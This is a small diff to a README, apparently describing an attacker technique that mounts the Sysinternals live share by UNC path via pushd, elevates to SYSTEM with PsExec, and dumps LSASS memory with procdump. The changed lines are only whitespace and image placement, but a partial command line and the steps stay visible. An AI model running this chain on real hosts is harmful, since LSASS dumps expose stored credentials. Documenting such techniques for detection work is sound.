@@ -6,10 +6,11 @@ pushd \\live.sysinternals.com\tools && psexec -s -i -d procdump.exe -accepteula 
 
     • Creating a temporary share by UNC path
     • Invoke PsExec -s to gain SYSTEM (psexec does not live on my device)
-    • Run further TTP (in this example, just a basic Lsass dump with procdump on src host but of course this can be RCE)
+    • Run further TTP (in this example, just a basic Lsass dump with procdump on src host but of course this can be RCE)  
 
 
-    ![image](https://github.com/jkerai1/pushdTTPIdea/assets/55988027/bd13b77d-5d27-429a-a359-7dfec7abf8b4)
+
+ ![image](https://github.com/jkerai1/pushdTTPIdea/assets/55988027/bd13b77d-5d27-429a-a359-7dfec7abf8b4)
     
 The Sysinternal binaries don't seem to exist on my disk but rather in memory  
 
